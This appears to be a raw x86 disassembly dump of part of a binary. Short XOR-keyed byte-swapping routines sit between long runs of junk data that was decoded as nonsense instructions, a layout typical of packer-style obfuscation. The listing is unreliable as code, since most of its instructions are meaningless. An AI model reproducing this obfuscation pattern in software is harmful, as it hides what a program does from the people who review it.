  4084fc:	mov    eax,ds:0xe0ae3ade
  408501:	cmp    al,0x25
  408503:	(bad)  
  408504:	out    dx,al
  408505:	xlat   BYTE PTR ds:[ebx]
  408506:	and    al,0xf8
  408508:	dec    edi
  408509:	sahf   
  40850a:	xor    BYTE PTR [edx+eax*2-0x47],cl
  40850e:	popf   
  40850f:	cmp    al,0x12
  408511:	ja     0x40852d
  408513:	cs (bad) 
  408515:	cld    
  408516:	xor    dh,BYTE PTR [ecx+0x2e]
  408519:	xor    DWORD PTR [ebx],esp
  40851b:	ss jp  0x408569
  40851e:	data16 mov dh,0x7a
  408521:	(bad)  
  408522:	retf   0xe2b5
  408525:	pop    es
  408526:	or     eax,DWORD PTR [ecx]
  408528:	inc    ebx
  408529:	and    edx,DWORD PTR [edx-0x6d176489]
  40852f:	lds    edi,FWORD PTR [ecx+0x53]
  408532:	rcr    BYTE PTR [edi+0x5c],0x16
  408536:	sahf   
  408537:	dec    ecx
  408538:	pushf  
  408539:	adc    ecx,esi
  40853b:	popa   
  40853c:	pop    esp
  40853d:	and    ecx,edi
  40853f:	jnp    0x408522
  408541:	in     al,dx
  408542:	in     eax,dx
  408543:	gs and al,ch
  408546:	push   0x3bade820
  40854b:	or     eax,0x9a8644a0
  408550:	and    cl,BYTE PTR [eax+ebp*2-0x26]
  408554:	sahf   
  408555:	iret   
  408556:	mov    ebp,0xf14c47f
  40855b:	in     al,dx
  40855c:	shl    DWORD PTR [ecx+0x76],1
  40855f:	add    al,BYTE PTR [ebp+0x6e]
  408562:	pop    edx
  408563:	stc    
  408564:	mov    edi,0x19996611
  408569:	inc    esp
  40856a:	fst    DWORD PTR [ebp+0x2b4a79a4]
  408570:	pusha  
  408571:	and    DWORD PTR [esi],esp
  408573:	push   edx
  408574:	inc    ebp
  408575:	nop
  408576:	xlat   BYTE PTR ds:[ebx]
  408577:	xchg   ebx,eax
  408578:	mov    eax,0x5980325b
  40857d:	or     ebx,DWORD PTR [eax]
  40857f:	stc    
  408580:	inc    ebx
  408581:	xchg   ecx,eax
  408582:	ror    DWORD PTR [ecx],1
  408584:	xor    eax,0x3b5d1b09
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0xcab6353f
  4085c4:	mov    cl,0xf7
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x4085ee
  4085cf:	adc    ch,BYTE PTR [ebp-0x161a6602]
  4085d5:	jle    0x408600
  4085d7:	xchg   ebx,eax
  4085d8:	fst    QWORD PTR [eax+0x5f]
  4085db:	cmp    bl,BYTE PTR [esi+0x1946099d]
  4085e1:	test   eax,0x1f541e5d
  4085e6:	int    0x62
  4085e8:	mov    WORD PTR [ebp-0x28237e82],ss
  4085ee:	sub    al,0x6b
  4085f0:	xchg   edx,eax
  4085f1:	pop    ds
  4085f2:	xchg   esi,eax
  4085f3:	xchg   ebp,eax
  4085f4:	adc    al,0x58
  4085f6:	push   cs
  4085f7:	push   0xffffffe6
  4085f9:	inc    ebx
  4085fa:	jo     0x408619
  4085fc:	ins    DWORD PTR es:[edi],dx
  4085fd:	jnp    0x4085e8
  4085ff:	xchg   esi,eax
  408600:	dec    ebx
  408601:	(bad)  
  408602:	rcl    DWORD PTR [eax+0x78175a19],cl
  408608:	rcr    DWORD PTR [ecx+0x79],cl
  40860b:	fwait
  40860c:	mov    edx,0x9ba941d4
  408611:	es jg  0x4085de
  408614:	test   DWORD PTR [ebx],ebx
  408616:	sub    esi,DWORD PTR [eax-0x34095c02]
  40861c:	add    BYTE PTR [ebp+ebx*8+0x3741c2a],dh
  408623:	cdq    
  408624:	xchg   ebx,eax
  408625:	and    BYTE PTR [ecx-0x6a],bl
  408628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408629:	push   ebx
  40862a:	xchg   ecx,eax
  40862b:	stos   DWORD PTR es:[edi],eax
  40862c:	inc    ecx
  40862d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40862e:	lods   eax,DWORD PTR ds:[esi]
  40862f:	inc    eax
  408630:	stc    
  408631:	jno    0x408625
  408633:	(bad)
  408637:	dec    edx
  408638:	(bad)  
  408639:	mov    edx,0x6cfb757b
  40863e:	stos   DWORD PTR es:[edi],eax
  40863f:	or     al,0xf9
  408641:	imul   edx,DWORD PTR [edx-0x4046d89],0x875a1c45
  40864b:	sub    al,0xf2
  40864d:	loope  0x408669
  40864f:	dec    ebp
  408650:	daa    
  408651:	out    dx,eax
  408652:	push   ds
  408653:	sbb    eax,0x4d95a1ba
  408658:	pusha  
  408659:	scas   eax,DWORD PTR es:[edi]
  40865a:	xor    DWORD PTR [eax],0xffffffd9
  40865d:	lahf   
  40865e:	and    edx,esi
  408660:	loop   0x408658
  408662:	enter  0xb926,0x33
  408666:	add    dl,BYTE PTR [eax-0x47]
  408669:	jmp    0x40862d
  40866b:	aaa    
  40866c:	mov    ds:0x4f1e923,al
  408671:	jne    0x408657
  408673:	test   eax,0x4d8b3b9d
  408678:	shl    DWORD PTR [ecx-0x2e8ffb04],1
  40867e:	mov    cl,0x9e
  408680:	push   es
  408681:	mov    ds:0xf455c15,eax
  408686:	mov    bh,0xde
  408688:	xor    BYTE PTR [ebx+0x143ae1de],ah
  40868e:	cld    
  40868f:	arpl   WORD PTR [edx],cx
  408691:	cwde   
  408692:	cmp    eax,0xe7c83cc9
  408697:	add    DWORD PTR [ecx+0x4880994b],0xffffffd9
  40869e:	pusha  
  40869f:	push   edx
  4086a0:	out    dx,eax
  4086a1:	out    0xcd,eax
  4086a3:	pop    edx
  4086a4:	sbb    DWORD PTR [esi-0x3dec7116],esi
  4086aa:	mov    eax,0x325b0a84
  4086af:	aam    0x1
  4086b1:	sub    al,0x3b
  4086b3:	pop    edx
  4086b4:	mov    ecx,0x3e8a5426
  4086b9:	popf   
  4086ba:	inc    edi
  4086bb:	cmp    DWORD PTR [ebx+0x24],0xa8935cf1
  4086c2:	or     al,0xfa
  4086c4:	in     eax,0xbe
  4086c6:	in     al,dx
  4086c7:	aad    0x77
  4086c9:	xchg   ebp,eax
  4086ca:	jo     0x4086c2
  4086cc:	test   eax,ebp
  4086ce:	jecxz  0x4086fa
  4086d0:	adc    esi,0xffffffc8
  4086d3:	jmp    0xd8b9:0xd3ae5dfd
  4086da:	fld    QWORD PTR ds:0xdb8c203d
  4086e0:	inc    eax
  4086e1:	jecxz  0x408663
  4086e3:	inc    ebx
  4086e4:	cmp    DWORD PTR [eax],eax
  4086e6:	clc    
  4086e7:	or     edi,eax
  4086e9:	or     DWORD PTR [ecx+0x34],ecx
  4086ec:	push   ebp
  4086ed:	out    0xba,al
  4086ef:	jge    0x4086dd
  4086f1:	inc    edi
  4086f2:	xor    DWORD PTR [eax-0x38693daa],esi
  4086f8:	mov    ds:0x35d06af4,al
  4086fd:	xor    dl,BYTE PTR [ecx-0x57]
  408700:	sub    eax,DWORD PTR [esi]
  408702:	arpl   WORD PTR [eax+0x16bd5a2f],dx
  408708:	mov    ebp,0x473b8d9a
  40870d:	retf   0xabc1
  408710:	daa    
  408711:	jno    0x4086fe
  408713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408714:	inc    eax
  408715:	(bad)  
  408716:	xchg   ebp,eax
  408717:	imul   eax,DWORD PTR [esp+ebp*8+0x3f735d5c],0x76613abf
  408722:	jae    0x408770
  408724:	shr    BYTE PTR [bx],cl
  408727:	add    eax,0x726030ca
  40872c:	mov    cs,WORD PTR [edx]
  40872e:	shl    DWORD PTR [ebx+0x41829af1],cl
  408734:	mov    bl,0xa8
  408736:	adc    bh,BYTE PTR [edi+ecx*1+0x24]
  40873a:	adc    DWORD PTR [ecx+ebp*4-0x1b744a74],0x21db41b
  408745:	daa    
  408746:	and    bh,BYTE PTR [ecx+0x5bee8a2c]
  40874c:	mov    esi,0xe7e68478
  408751:	out    dx,eax
  408752:	or     ecx,DWORD PTR [ecx-0x56]
  408755:	ror    ecx,0xd8
  408758:	mov    ds:0x15781a67,al
  40875d:	jnp    0x4087c5
  40875f:	aas    
  408760:	mov    cl,0x94
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	retf   0x2f9b
  40884a:	ja     0x4088c9
  40884c:	aad    0x7e
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x40888f
  408854:	out    dx,eax
  408855:	cld    
  408856:	jno    0x40886e
  408858:	stos   BYTE PTR es:[edi],al
  408859:	cmp    al,0xd7
  40885b:	inc    edx
  40885c:	jbe    0x40880a
  40885e:	cli    
  40885f:	push   eax
  408860:	sub    BYTE PTR [esi-0xa],bh
  408863:	lds    edx,FWORD PTR [esp+eiz*4-0x4013f467]
  40886a:	pop    ebx
  40886b:	pushf  
  40886c:	xchg   esi,eax
  40886d:	mov    bl,BYTE PTR [esi+0x5d051b30]
  408873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408874:	or     eax,0x2bfaa61e
  408879:	imul   esp,DWORD PTR [ebp+0x45],0x992dad6f
  408880:	mov    ds:0xf39d6e1,eax
  408885:	pop    es
  408886:	stos   DWORD PTR es:[edi],eax
  408887:	xchg   ecx,eax
  408888:	les    ebx,FWORD PTR [eax]
  40888a:	repz neg ch
  40888d:	stc    
  40888e:	loopne 0x4088d6
  408890:	adc    dh,BYTE PTR [ecx]
  408892:	xchg   BYTE PTR [esi],cl
  408894:	inc    edi
  408895:	jae    0x408846
  408897:	outs   dx,BYTE PTR ds:[esi]
  408898:	mov    esi,0xda18bb0a
  40889d:	(bad)  
  40889e:	div    DWORD PTR [eax-0x1e96edd5]
  4088a4:	std    
  4088a5:	inc    edi
  4088a6:	(bad)
  4088aa:	and    eax,0x116705c6
  4088af:	or     dh,BYTE PTR [eax+0x3f]
  4088b2:	adc    ecx,DWORD PTR ds:0x57f55d68
  4088b8:	leave  
  4088b9:	clc    
  4088ba:	je     0x408913
  4088bc:	mov    ebp,0x54ae9065
  4088c1:	int    0x7
  4088c3:	mov    ebp,0x26f66892
  4088c8:	add    al,0xca
  4088ca:	inc    esi
  4088cb:	jmp    0x40889e
  4088cd:	jnp    0x408947
  4088cf:	sbb    ah,BYTE PTR [ebx-0x2e]
  4088d2:	push   eax
  4088d3:	in     al,0x99
  4088d5:	outs   dx,BYTE PTR ds:[esi]
  4088d6:	xchg   esi,eax
  4088d7:	jae    0x40888e
  4088d9:	out    0xa6,al
  4088db:	(bad)  
  4088dc:	and    ah,ah
  4088de:	loope  0x408942
  4088e0:	inc    edx
  4088e1:	mov    BYTE PTR [ebp+0x59],dh
  4088e4:	inc    ecx
  4088e5:	std    
  4088e6:	mov    bl,ah
  4088e8:	jo     0x4088d5
  4088ea:	inc    ebp
  4088eb:	inc    ebp
  4088ec:	mov    eax,ds:0x9f8fcc09
  4088f1:	ins    DWORD PTR es:[edi],dx
  4088f2:	jl     0x4088b9
  4088f4:	xor    BYTE PTR ds:0xdfcc5b32,dl
  4088fa:	in     eax,dx
  4088fb:	cmp    DWORD PTR [ebp+0x13],ebx
  4088fe:	cli    
  4088ff:	rol    DWORD PTR gs:[eax+0x3b],1
  408903:	cmp    eax,0x641f31fd
  408908:	icebp  
  408909:	(bad)  
  40890a:	mov    ds:0xfc693011,eax
  40890f:	repnz xchg ebp,eax
  408911:	mov    ds:0xe80645d2,eax
  408916:	jmp    0x4088e4
  408918:	adc    eax,DWORD PTR [esi+0x580d754]
  40891e:	adc    al,0x89
  408920:	pop    ebx
  408921:	mov    dh,bh
  408923:	pushf  
  408924:	loop   0x4088c8
  408926:	stc    
  408927:	(bad)  
  408928:	aam    0x10
  40892a:	shl    DWORD PTR [edi+0x54],cl
  40892d:	or     al,0x5c
  40892f:	push   esp
  408930:	cmp    ch,al
  408932:	test   al,0x5a
  408934:	hlt    
  408935:	xchg   edx,eax
  408936:	push   ss
  408937:	sub    eax,0x58d8181
  40893c:	mov    ah,0x7d
  40893e:	adc    al,0x77
  408940:	(bad)  
  408941:	bound  esp,QWORD PTR [esi-0x65]
  408944:	div    DWORD PTR [edi]
  408946:	mov    eax,0x89719603
  40894b:	mov    ebp,0x7d78f419
  408950:	pop    edi
  408951:	push   ebx
  408952:	in     al,dx
  408953:	mov    BYTE PTR [ecx+0x7a3a0b13],ch
  408959:	pop    ecx
  40895a:	push   0xfffffff3
  40895c:	std    
  40895d:	add    cl,BYTE PTR [ebx+ecx*1]
  408960:	push   ebp
  408961:	mul    BYTE PTR [ebx+0x483189bb]
  408967:	mov    ebp,0x5c554f4b
  40896c:	das    
  40896d:	sbb    bl,bl
  40896f:	dec    ebp
  408970:	cwde   
  408971:	jns    0x408905
  408973:	ja     0x40896a
  408975:	inc    edi
  408976:	xchg   ebx,eax
  408977:	enter  0x129c,0x32
  40897b:	push   eax
  40897c:	adc    esp,DWORD PTR [esi-0x58]
  40897f:	clc    
  408980:	mov    esp,0x7414f223
  408985:	les    esp,FWORD PTR [eax+0x37]
  408988:	push   ebx
  408989:	sti    
  40898a:	sub    esp,DWORD PTR [edi]
  40898c:	aas    
  40898d:	das    
  40898e:	mov    ebp,0x2b960fdf
  408993:	aad    0x21
  408995:	scas   eax,DWORD PTR es:[edi]
  408996:	push   ebp
  408997:	ret    0x40cd
  40899a:	mov    cl,0x60
  40899c:	test   eax,0x3ebcbcb4
  4089a1:	jae    0x408941
  4089a3:	jp     0x408950
  4089a5:	dec    ecx
  4089a6:	sub    bh,dh
  4089a8:	xor    DWORD PTR [ecx+0x2af27a0],edi
  4089ae:	xor    al,0xc9
  4089b0:	sub    DWORD PTR [ecx],ebx
  4089b2:	lods   eax,DWORD PTR ds:[esi]
  4089b3:	add    bh,dl
  4089b5:	sar    edi,cl
  4089b7:	ret    
  4089b8:	push   ebx
  4089b9:	int    0x40
  4089bb:	mov    ebp,0x3fcf2b7c
  4089c0:	mov    bl,0xcf
  4089c2:	inc    ebp
  4089c3:	sub    edi,ebp
  4089c5:	inc    edx
  4089c6:	(bad)  
  4089c7:	mov    ah,0x45
  4089c9:	mov    DWORD PTR [esi+0x2d],esi
  4089cc:	pop    esp
  4089cd:	lock sbb eax,0x15308988
  4089d3:	dec    ecx
  4089d4:	push   ebp
  4089d5:	pop    ecx
  4089d6:	rcr    BYTE PTR ds:[ecx-0x63],0x2
  4089db:	fwait
  4089dc:	test   eax,0xfd437171
  4089e1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4089e3:	pop    esp
  4089e4:	imul   al
  4089e6:	jmp    0xaf0f:0xf903f833
  4089ed:	sti    
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	cmp    BYTE PTR [edx-0x2d76c7ed],bl
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x4089a9
  408a13:	xchg   ebx,eax
  408a14:	je     0x408a64
  408a16:	inc    edi
  408a17:	stc    
  408a18:	sub    bh,ah
  408a1a:	ja     0x4089e1
  408a1c:	pushf  
  408a1d:	sbb    eax,0x8a5fb19f
  408a22:	sbb    bh,BYTE PTR [ecx]
  408a24:	rol    DWORD PTR [eax+0x2745aec2],cl
  408a2a:	push   esi
  408a2b:	int    0xa3
  408a2d:	in     eax,dx
  408a2e:	mov    eax,ds:0xada59f83
  408a33:	(bad)  
  408a34:	rcl    DWORD PTR [ecx-0x1f],1
  408a37:	cmp    ecx,DWORD PTR [esi]
  408a39:	xchg   ebp,eax
  408a3a:	addr16 mov eax,esp
  408a3d:	add    DWORD PTR [edx],ecx
  408a3f:	test   al,0xbd
  408a41:	loopne 0x4089ce
  408a43:	or     ah,BYTE PTR [edi+0x54]
  408a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a47:	adc    BYTE PTR [edx+esi*2],ah
  408a4a:	add    al,0x3f
  408a4c:	mov    eax,0xb9d918e4
  408a51:	fbld   TBYTE PTR ds:0x1b0a4387
  408a57:	fisub  WORD PTR [ebx-0x3e]
  408a5a:	jge    0x4089ed
  408a5c:	jb     0x408ac7
  408a5e:	push   cs
  408a5f:	mov    bh,0x14
  408a61:	and    ebx,ebp
  408a63:	rcl    BYTE PTR [eax],1
  408a65:	test   eax,0x2f33fb1e
  408a6a:	pop    ss
  408a6b:	sub    DWORD PTR [eax-0x48],0x6a
  408a6f:	push   es
  408a70:	push   0x60
  408a72:	test   DWORD PTR [edi-0x6b2a36ac],esp
  408a78:	arpl   bx,bp
  408a7a:	mov    ah,0x82
  408a7c:	cmp    eax,0x77df8c6f
  408a81:	dec    edx
  408a82:	jns    0x408ab2
  408a84:	das    
  408a85:	adc    bl,ah
  408a87:	imul   esi,DWORD PTR [eax+edi*8+0x4b],0xffffffb2
  408a8c:	loop   0x408a33
  408a8e:	ror    BYTE PTR [eax],1
  408a90:	add    bl,BYTE PTR gs:[edx]
  408a93:	stc    
  408a94:	mov    ds:0x1ef1f025,al
  408a99:	(bad)  
  408a9a:	(bad)  
  408a9b:	adc    DWORD PTR [ebx],ecx
  408a9d:	cmp    edx,DWORD PTR [esi+0x63]
  408aa0:	pop    edi
  408aa1:	jp     0x408aa3
  408aa3:	xor    eax,DWORD PTR [eax]
  408aa5:	fnsave [ecx+0x78ed9058]
  408aab:	int3   
  408aac:	and    eax,0x9009826c
  408ab1:	pusha  
  408ab2:	adc    BYTE PTR ds:[esi+0x6a],dl
  408ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ab7:	jnp    0x408ab8
  408ab9:	stos   BYTE PTR es:[edi],al
  408aba:	mov    dl,0x88
  408abc:	repnz pop esp
  408abe:	sbb    al,0xae
  408ac0:	or     ebp,DWORD PTR [eax+0x31]
  408ac3:	mov    al,ds:0xbfd86a11
  408ac8:	jle    0x408a50
  408aca:	jbe    0x408a4d
  408acc:	push   ecx
  408acd:	mov    edx,0x7a857654
  408ad2:	shl    BYTE PTR [ebp-0x3],0x44
  408ad6:	stc    
  408ad7:	dec    eax
  408ad8:	pop    eax
  408ad9:	pop    esp
  408ada:	(bad)  
  408adb:	aaa    
  408adc:	stos   DWORD PTR es:[edi],eax
  408add:	sub    BYTE PTR [edx-0xdee8da3],cl
  408ae3:	dec    edx
  408ae4:	std    
  408ae5:	or     ch,0x85
  408ae8:	or     ecx,esp
  408aea:	and    DWORD PTR [ebx],ebp
  408aec:	lahf   
  408aed:	in     al,dx
  408aee:	mov    ch,0x94
  408af0:	mov    cl,0xd0
  408af2:	ins    DWORD PTR es:[edi],dx
  408af3:	jbe    0x408abe
  408af5:	sbb    DWORD PTR [edx+0x5d32dbfc],ecx
  408afb:	push   ebp
  408afc:	sub    DWORD PTR [esi+0x41],esp
  408aff:	pop    ss
  408b00:	and    DWORD PTR [edi-0x2bf8d607],esi
  408b06:	xchg   ebx,eax
  408b07:	stos   DWORD PTR es:[edi],eax
  408b08:	jo     0x408b2d
  408b0a:	in     al,dx
  408b0b:	ja     0x408b71
  408b0d:	push   ecx
  408b0e:	mov    WORD PTR [esi],es
  408b10:	lahf   
  408b11:	xchg   ebp,eax
  408b12:	test   eax,0x5c5d0793
  408b17:	or     eax,0x73224bb0
  408b1c:	aaa    
  408b1d:	xchg   esi,ebp
  408b1f:	pop    edx
  408b20:	xor    ecx,edi
  408b22:	mov    BYTE PTR [ecx-0x73c8530],dl
  408b28:	push   ecx
  408b29:	xor    al,0x59
  408b2b:	mov    esi,0x8ec1d725
  408b30:	out    0xb4,al
  408b32:	ins    BYTE PTR es:[edi],dx
  408b33:	jl     0x408b66
  408b35:	pop    esp
  408b36:	rol    DWORD PTR [ebx-0x7c8062e5],1
  408b3c:	fisub  DWORD PTR [esi+0x1688e5f0]
  408b42:	mov    gs,WORD PTR [edx-0x4f8da609]
  408b48:	jmp    0x408b66
  408b4a:	fisub  WORD PTR [ebx]
  408b4c:	mov    ah,0xa5
  408b4e:	jl     0x408b97
  408b50:	std    
  408b51:	push   edi
  408b52:	or     ah,BYTE PTR [edx]
  408b54:	mov    ch,0x8
  408b56:	or     bh,BYTE PTR [ecx]
  408b58:	sbb    BYTE PTR [eax+0x2fed785d],cl
  408b5e:	mov    bh,0xc4
  408b60:	daa    
  408b61:	std    
  408b62:	cmp    dh,BYTE PTR es:[ebp+ebx*8+0x5d]
  408b67:	aam    0xd9
  408b69:	push   es
  408b6a:	ss aam 0xd3
  408b6d:	ret    
  408b6e:	sti    
  408b6f:	mov    esp,ecx
  408b71:	sbb    DWORD PTR ds:0x262976de,ebx
  408b77:	scas   al,BYTE PTR es:[edi]
  408b78:	jle    0x408b47
  408b7a:	fdiv   DWORD PTR [esi+0x5c]
  408b7d:	add    al,0xc
  408b7f:	xchg   cx,ax
  408b81:	sti    
  408b82:	fidivr DWORD PTR [edx+0x20]
  408b85:	jb     0x408b54
  408b87:	push   cs
  408b88:	int3   
  408b89:	jl     0x408c07
  408b8b:	cs cmp ebp,0xffffffb0
  408b8f:	mov    edi,0x1be793cd
  408b94:	and    ah,BYTE PTR [eax-0xabce8cb]
  408b9a:	cmc    
  408b9b:	popf   
  408b9c:	jl     0x408b5c
  408b9e:	lods   eax,DWORD PTR ds:[esi]
  408b9f:	xchg   esi,eax
  408ba0:	push   ss
  408ba1:	aaa    
  408ba2:	inc    eax
  408ba3:	adc    eax,0xbc8dfc57
  408ba8:	pop    ds
  408ba9:	fwait
  408baa:	jb     0x408bde
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	xor    DWORD PTR [esi+eiz*8],0x6f
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408ba0
  408be5:	mov    bl,0xce
  408be7:	mov    dh,0xe5
  408be9:	mov    al,ds:0x341dec39
  408bee:	xor    DWORD PTR [ecx+0xd086c75],ebp
  408bf4:	int    0xd9
  408bf6:	lgs    esi,FWORD PTR [ecx-0x1d]
  408bfa:	push   esi
  408bfb:	inc    edx
  408bfc:	jmp    0x408b88
  408bfe:	pop    edi
  408bff:	(bad)  
  408c00:	fcmovnu st,st(7)
  408c02:	je     0x408c39
  408c04:	imul   esi,DWORD PTR [edx],0xffffff85
  408c07:	jp     0x408bb7
  408c09:	fs add eax,0xdaa46b9
  408c0f:	sbb    al,0x2b
  408c11:	jae    0x408c04
  408c13:	addr16 adc ebx,ebx
  408c16:	stc    
  408c17:	xchg   BYTE PTR [edx-0x1f045509],bh
  408c1d:	push   ss
  408c1e:	retf   
  408c1f:	daa    
  408c20:	xor    eax,0xbfbc1af9
  408c25:	into   
  408c26:	fwait
  408c27:	mov    al,ds:0xd7152ce7
  408c2c:	rcl    DWORD PTR [ebx-0x7c75454f],cl
  408c32:	lods   eax,DWORD PTR ds:[esi]
  408c33:	imul   esp,ecx,0x5d
  408c36:	iret   
  408c37:	xor    ecx,DWORD PTR [edx-0x30102421]
  408c3d:	adc    dl,BYTE PTR [ebp-0x80]
  408c40:	out    dx,al
  408c41:	inc    esp
  408c42:	enter  0x9185,0xfe
  408c46:	fimul  DWORD PTR [eax]
  408c48:	mov    DWORD PTR [edi],0xc96547e4
  408c4e:	sbb    DWORD PTR ds:0x82fd5a71,ebp
  408c54:	rol    DWORD PTR [edi],1
  408c56:	ss push 0x2d
  408c59:	push   ds
  408c5a:	bnd ret 
  408c5c:	xor    DWORD PTR [ecx],esp
  408c5e:	and    ebx,DWORD PTR [edi]
  408c60:	sub    ebp,eax
  408c62:	(bad)  
  408c63:	mov    WORD PTR [edx+edi*1+0x6b],fs
  408c67:	stos   DWORD PTR es:[edi],eax
  408c68:	mov    ds:0x590e57cf,al
  408c6d:	test   eax,0x9eb87471
  408c72:	sbb    BYTE PTR ds:0x6a922b45,ch
  408c78:	sub    ecx,DWORD PTR [ecx+0x0]
  408c7b:	adc    al,0x89
  408c7d:	mov    bh,0xc3
  408c7f:	dec    edi
  408c80:	add    eax,0xbfbe36fc
  408c85:	xor    al,0x6
  408c87:	pusha  
  408c88:	push   0x7e0df7db
  408c8d:	cmp    BYTE PTR [eax],ah
  408c8f:	sbb    ah,BYTE PTR ds:0xe092ec57
  408c95:	cli    
  408c96:	sub    esp,esi
  408c98:	repz or al,0x83
  408c9b:	pop    ds
  408c9c:	sbb    DWORD PTR [esi],ebx
  408c9e:	mov    ecx,0xd9f4edc5
  408ca3:	mov    cl,0xb7
  408ca5:	jmp    0x33517291
  408caa:	pop    esp
  408cab:	jecxz  0x408c80
  408cad:	xor    bh,dl
  408caf:	popf   
  408cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cb1:	or     bh,BYTE PTR [ebx]
  408cb3:	rcr    DWORD PTR [ebx-0x6a064349],1
  408cb9:	pop    es
  408cba:	push   0xfffffff4
  408cbc:	sub    edx,0xffffff8f
  408cbf:	in     al,dx
  408cc0:	cdq    
  408cc1:	adc    DWORD PTR [edx],0x2c53b96c
  408cc7:	jmp    0xd9b8bbc2
  408ccc:	mov    al,0x9c
  408cce:	and    eax,0x55658923
